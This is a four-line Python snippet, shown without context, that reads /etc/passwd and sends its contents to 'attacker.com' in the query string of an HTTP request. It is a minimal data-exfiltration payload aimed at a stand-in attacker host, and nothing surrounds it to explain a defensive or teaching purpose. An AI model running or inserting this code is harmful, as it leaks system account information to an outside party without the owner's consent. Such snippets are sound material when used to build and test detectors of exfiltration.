import urllib.request
with open("/etc/passwd") as f:
    data = f.read()
urllib.request.urlopen(f"http://attacker.com/steal?data={data}")
